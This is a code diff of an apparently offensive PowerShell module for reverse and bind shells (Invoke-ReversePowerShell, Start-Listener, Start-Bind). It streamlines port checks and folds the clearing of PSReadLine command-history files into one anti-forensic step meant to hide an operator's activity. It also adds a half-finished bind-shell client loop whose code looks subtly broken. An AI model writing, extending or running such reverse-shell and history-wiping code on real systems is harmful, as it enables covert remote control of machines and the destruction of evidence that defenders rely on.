@@ -62,35 +62,13 @@ Function Start-Listener {
     $PortString = $Port.ToString()
 
     Write-Verbose "Checking for availability of $PortString"
-    
-    $Obj = @()
+
     $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
     $Connections = $TCPProperties.GetActiveTcpListeners()
-    ForEach ($Connection in $Connections)
+    If ($Connections.Port -Contains "$Port") 
     {
 
-        If ($Connection.Address.AddressFamily -eq "InterNetwork")
-        {
-        
-            $IPType = "IPv4"
-        
-        }  # End If
-        Else
-        {
-            
-            $IPType = "IPv6"
-        
-        }  # End Else            
-
-        $Obj += New-Object -TypeName PSObject -Property @{Address=$Connection.Address; Port=$Connection.Port; ClassType=$IPType}
-        
-    }  # End ForEach
-
-    $PortAvailabilityCheck = $Obj | Where-Object -Property Port -like $Port
-    If ($PortAvailabilityCheck)
-    {
-
-        Throw "[!] Port $Port is alreday in use by a process(es). Select another port to use or stop the occupying processes."
+        Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."
 
     }  # End If
 
@@ -246,35 +224,14 @@ Function Start-Bind {
         $PortString = $Port.ToString()
 
         Write-Verbose "Checking for availability of $PortString"
-        $Obj = @()
+
         $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
         $Connections = $TCPProperties.GetActiveTcpListeners()
-        ForEach ($Connection in $Connections)
+        If ($Connections.Port -Contains "$Port") 
         {
-
-            If ($Connection.Address.AddressFamily -eq "InterNetwork")
-            {
-            
-                $IPType = "IPv4"
-            
-            }  # End If
-            Else
-            {
-                
-                $IPType = "IPv6"
-            
-            }  # End Else            
-
-            $Obj += New-Object -TypeName PSObject -Property @{Address=$Connection.Address; Port=$Connection.Port; ClassType=$IPType}
-            
-        }  # End ForEach
-
-        $PortAvailabilityCheck = $Obj | Where-Object -Property Port -like $Port
-        If ($PortAvailabilityCheck)
-        {
-
+    
             Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."
-
+    
         }  # End If
 
         Write-Verbose "Creating listener on port $PortString"
@@ -533,10 +490,10 @@ Function Invoke-ReversePowerShell {
 
                             Write-Output "[*] Attempting to clear command history"
 
+                            $CmdHistoryFiles = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+                            
                             Clear-History
-                            Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt" -Force
-                            Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt" -Force
-                            Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
+                            Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue
 
                         }  # End If
 
@@ -583,60 +540,39 @@ Function Invoke-ReversePowerShell {
 
                 } # End While
                 $Client.Close()
-                If ($Listener)
-                {
-                
-                    $Listener.Stop()
-                
-                }  # End If
-        }  # End Reverse Switch
 
-        'Bind' {
+            }  # End Reverse Switch
 
-            Throw "Sorry I am still working on this"
-            # $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+            'Bind' {
 
-        }  # End Bind Switch
+            Write-Warning "Sorry this is not there yet. I am still figuring this part out"
+            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+            $Stream = $Client.GetStream()
 
-    }  # End Switch
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            {
+
+                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
+                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                $Stream.Flush()
+
+            } # End While
+            
+            $Client.Close()
+
+            }  # End Bind Switch
+
+            }  # End Switch
     
         } # End Try
         Catch
         {
 
             Write-Output "There was a connection error. Retrying occurs every 30 seconds"
-            If ($Client.Connected)
-            {
 
-                If ($ClearHistory.IsPresent)
-                {
-
-                    Write-Output "[*] Attempting to clear command history"
-
-                    Clear-History
-                    Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt" -Force
-                    Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt" -Force
-                    Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
-
-                }  # End If
-
-                Write-Verbose "Client closing..."
-                $Client.Close()
-                Write-Verbose "Client connection closed"
-
-            } # End If
-
-            If ($ClearHistory.IsPresent)
-            {
-
-                Write-Verbose "Attempting to clear command history"
-
-                Clear-History
-                Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt" -Force
-                Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt" -Force
-                Clear-Content -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
-
-            }  # End If
+            Write-Verbose "Client closing..."
+            $Client.Close()
+            Write-Verbose "Client connection closed"
 
             Write-Verbose "Begining countdown timer to reestablish failed connection"
             [Int]$Timer = 30
